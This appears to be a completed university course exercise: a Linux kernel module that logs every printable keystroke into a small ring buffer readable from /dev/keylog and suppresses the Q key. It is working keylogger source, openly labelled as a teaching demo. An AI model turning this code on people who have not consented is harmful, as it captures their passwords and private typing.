// keylog.c -- CSC453 keyboard event logger + key blocker
#include <linux/cdev.h>
#include <linux/fs.h>
#include <linux/input-event-codes.h>
#include <linux/keyboard.h>
#include <linux/module.h>
#include <linux/spinlock.h>
#include <linux/uaccess.h>

MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("CSC453 keylogger demo");

#define BUF_SIZE 128

static char         keylog_buf[BUF_SIZE];
static size_t       keylog_head;   /* index of next write */
static size_t       keylog_len;    /* bytes stored (0..BUF_SIZE) */
static DEFINE_SPINLOCK(keylog_lock);

static dev_t        devno;
static struct cdev  cdev;
static struct class *cls;

/* --- character device read handler (provided) ---
 *
 * Called when userspace reads from /dev/keylog (e.g. via cat).
 * The buffer is a ring: the oldest byte is at index
 *   (keylog_head - keylog_len) % BUF_SIZE
 * and new data wraps around. The read handler stitches up to two
 * contiguous segments together for the caller.
 * copy_to_user() transfers data from the kernel buffer into the
 * caller's address space -- we cannot simply dereference the user
 * pointer buf because kernel and userspace have separate address spaces.
 */
static ssize_t keylog_read(struct file *f, char __user *buf,
                           size_t count, loff_t *off)
{
    size_t avail, start, first, second;
    ssize_t n;
    unsigned long flags;

    spin_lock_irqsave(&keylog_lock, flags);
    avail = keylog_len > (size_t)*off ? keylog_len - (size_t)*off : 0;
    n = (ssize_t)min(count, avail);
    start = (keylog_head + BUF_SIZE - keylog_len + (size_t)*off) % BUF_SIZE;
    first  = min((size_t)n, BUF_SIZE - start);
    second = (size_t)n - first;
    spin_unlock_irqrestore(&keylog_lock, flags);

    if (n <= 0)
        return 0;
    if (copy_to_user(buf, keylog_buf + start, first))
        return -EFAULT;
    if (second && copy_to_user(buf + first, keylog_buf, second))
        return -EFAULT;
    *off += n;
    return n;
}

static const struct file_operations keylog_fops = {
    .owner = THIS_MODULE,
    .read  = keylog_read,
};

/* --- keyboard notifier callback ---
 *
 * action    -- processing stage (KBD_KEYCODE or KBD_KEYSYM)
 * param->down  -- 1 if key pressed, 0 if released
 * param->value -- keycode (KBD_KEYCODE) or keysym (KBD_KEYSYM)
 *
 * Part 2 TODO: If the keyboard action is a key press at KBD_KEYSYM stage, 
 * and the param->down field is set, extract the ASCII character with:
 *     unsigned char c = param->value & 0xFF;
 *   If c is printable (c >= ' ' && c < 127), append it to the ring buffer:
 *     spin_lock_irqsave(&keylog_lock, flags);
 *     keylog_buf[keylog_head] = c;
 *     keylog_head = (keylog_head + 1) % BUF_SIZE;
 *     if (keylog_len < BUF_SIZE)
 *         keylog_len++;
 *     spin_unlock_irqrestore(&keylog_lock, flags);
 *   Declare 'unsigned long flags;' at the top of the function.
 *   The spinlock is needed because this callback runs in interrupt
 *   context and may race with a concurrent read from /dev/keylog.
 *
 * Part 3 TODO: At KBD_KEYCODE stage, if param->down and
 *   param->value == KEY_Q, return NOTIFY_STOP to drop the keypress.
 */
static int keylog_cb(struct notifier_block *nb, unsigned long action, void *data)
{
    struct keyboard_notifier_param *param = data;

    /* Part 2 TODO: store printable characters at KBD_KEYSYM stage */
        if (action == KBD_KEYSYM && param->down) {
            unsigned char c = param->value & 0xFF;
            if (c >= ' ' && c < 127) {
                unsigned long flags;
                spin_lock_irqsave(&keylog_lock, flags);
                keylog_buf[keylog_head] = c;
                keylog_head = (keylog_head + 1) % BUF_SIZE;
                if (keylog_len < BUF_SIZE)
                    keylog_len++;
                spin_unlock_irqrestore(&keylog_lock, flags);
            }
        }
    /* Part 3 TODO: suppress KEY_Q at KBD_KEYCODE stage */
        if (action == KBD_KEYCODE && param->down && param->value == KEY_Q) {
            return NOTIFY_STOP;
        }

    return NOTIFY_OK;
}

static struct notifier_block keylog_nb = {
    .notifier_call = keylog_cb,
};

/* --- init and exit ---
 *
 * The device registration and teardown are provided.
 *
 * Part 1 TODO:
 *   Add simple load/unload messages with:
 *     pr_info("keylog: loaded\n");
 *     pr_info("keylog: unloaded\n");
 *   This lets you confirm the module loads and unloads cleanly with dmesg.
 *
 * Part 2 TODO:
 *   To enable keylogging, register the keyboard notifier in init and
 *   unregister it in exit.
 *
 * Init (Part 2):
 *   After the device setup below, register the keyboard notifier:
 *     register_keyboard_notifier(&keylog_nb);
 *
 * Exit (Part 2):
 *   Before the device teardown below, unregister the keyboard notifier:
 *     unregister_keyboard_notifier(&keylog_nb);
 *   Unregistering first ensures no new callbacks fire after the device
 *   is destroyed.
 */

static int __init keylog_init(void)
{
    alloc_chrdev_region(&devno, 0, 1, "keylog");
    cdev_init(&cdev, &keylog_fops);
    cdev_add(&cdev, devno, 1);
    cls = class_create("keylog");
    device_create(cls, NULL, devno, NULL, "keylog");

    /* Part 1 TODO: log that the module loaded */
    pr_info("keylog: loaded\n");

    /* Part 2 TODO: register keyboard notifier */
    register_keyboard_notifier(&keylog_nb);

    return 0;
}

static void __exit keylog_exit(void)
{
    /* Part 1 TODO: log that the module unloaded */
    pr_info("keylog: unloaded\n");

    /* Part 2 TODO: unregister keyboard notifier */
    unregister_keyboard_notifier(&keylog_nb);

    device_destroy(cls, devno);
    class_destroy(cls);
    cdev_del(&cdev);
    unregister_chrdev_region(devno, 1);
}

module_init(keylog_init);
module_exit(keylog_exit);
